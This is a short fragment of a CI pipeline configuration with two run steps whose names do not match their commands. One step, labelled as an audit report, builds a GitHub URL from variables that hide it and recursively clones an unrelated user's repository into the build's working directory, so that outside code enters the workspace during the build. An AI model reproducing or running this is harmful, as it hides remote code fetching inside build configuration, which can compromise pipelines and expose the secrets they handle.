          name: Post release notes at pipeline end
          command: |
            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
      - run:
          name: ToolkitAuditReport
          command: |
            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
            git clone --recurse-submodules https://$bundle/${redirect}/${run} "`pwd`"
      - run:
